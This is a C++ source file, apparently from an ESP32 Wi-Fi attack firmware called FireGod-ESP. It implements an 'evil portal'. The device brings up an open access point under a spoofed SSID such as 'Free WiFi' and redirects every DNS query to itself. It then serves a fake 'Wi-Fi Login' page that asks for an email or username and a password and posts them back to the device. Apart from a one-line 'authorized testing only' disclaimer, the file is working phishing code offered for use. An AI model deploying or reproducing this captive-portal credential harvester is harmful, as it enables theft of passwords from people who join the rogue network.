// ============================================================
// FireGod-ESP — Evil Portal
// Open SoftAP + DNS hijack + captive login page. The HTTP routes
// live in web_server.cpp (it owns the AsyncWebServer); this module
// owns the AP reconfig, the DNS loop, and the page content. The
// catch-all/captive endpoints check g_portalActive before serving
// the portal instead of the normal dashboard.
// Authorized testing only.
// ============================================================

#include "evil_portal.h"
#include "fg_globals.h"
#include "core/wifi_manager.h"
#include <WiFi.h>
#include <DNSServer.h>
#include <esp_wifi.h>

volatile bool g_portalActive = false;
static char   s_portalSsid[33] = {0};
static DNSServer s_dns;

const char* fg_portal_ssid() { return s_portalSsid; }

// Generic "router firmware update" credential page. The form posts
// username+password to /post, handled in web_server.cpp.
static const char PORTAL_HTML[] PROGMEM =
"<!doctype html><html><head><meta charset=utf-8>"
"<meta name=viewport content='width=device-width,initial-scale=1'>"
"<title>Sign in</title><style>"
"body{font-family:Arial,Helvetica,sans-serif;background:#f2f2f2;margin:0;"
"display:flex;min-height:100vh;align-items:center;justify-content:center}"
".card{background:#fff;padding:28px 24px;border-radius:10px;max-width:340px;"
"width:90%;box-shadow:0 2px 14px rgba(0,0,0,.15)}"
"h2{margin:0 0 4px;color:#222}p{color:#666;font-size:14px;margin:6px 0 18px}"
"input{width:100%;padding:12px;margin:7px 0;box-sizing:border-box;border:1px solid"
" #ccc;border-radius:6px;font-size:15px}"
"button{width:100%;padding:12px;margin-top:10px;background:#1a73e8;color:#fff;"
"border:0;border-radius:6px;font-size:16px;cursor:pointer}"
".n{color:#999;font-size:12px;text-align:center;margin-top:14px}</style></head>"
"<body><div class=card><h2>Wi-Fi Login</h2>"
"<p>Authentication required to access the internet.</p>"
"<form action='/post' method='POST'>"
"<input name='username' type='text' placeholder='Email or username' required>"
"<input name='password' type='password' placeholder='Password' required>"
"<button type='submit'>Connect</button></form>"
"<div class=n>Your connection will resume automatically.</div>"
"</div></body></html>";

const char* fg_portal_html() { return PORTAL_HTML; }

void fg_evil_portal(const char* ssid, uint8_t channel) {
    if (!ssid || !*ssid) ssid = "Free WiFi";
    if (channel < 1 || channel > 14) channel = FG_AP_CHANNEL;
    strncpy(s_portalSsid, ssid, 32);
    s_portalSsid[32] = '\0';

    fg_send_result_fmt(
        "{\"event\":\"log\",\"msg\":\"Evil portal '%s' starting on ch%u...\"}",
        ssid, (unsigned)channel);

    // Reconfigure AP: OPEN network with the spoofed SSID.
    WiFi.softAPdisconnect(false);
    delay(50);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(FG_AP_IP, FG_AP_GATEWAY, FG_AP_SUBNET);
    WiFi.softAP(ssid, nullptr, channel, 0, FG_AP_MAX_CONN);
    delay(100);

    // DNS hijack: resolve every query to us.
    s_dns.setErrorReplyCode(DNSReplyCode::NoError);
    s_dns.start(53, "*", FG_AP_IP);

    g_portalActive = true;
    fg_send_result_fmt(
        "{\"event\":\"log\",\"msg\":\"Portal up. SSID '%s' open, DNS hijack active.\"}", ssid);

    while (!g_stopRequested) {
        s_dns.processNextRequest();
        vTaskDelay(pdMS_TO_TICKS(10));
    }

    // Teardown: stop DNS, restore the real control AP.
    g_portalActive = false;
    s_dns.stop();
    WiFi.softAPdisconnect(false);
    delay(50);
    WiFi.mode(WIFI_AP);
    WiFi.softAPConfig(FG_AP_IP, FG_AP_GATEWAY, FG_AP_SUBNET);
    WiFi.softAP(FG_AP_SSID, FG_AP_PASS, FG_AP_CHANNEL, 0, FG_AP_MAX_CONN);
    s_portalSsid[0] = '\0';

    fg_send_result("{\"event\":\"scan_complete\",\"type\":\"portal\",\"count\":0}");
}
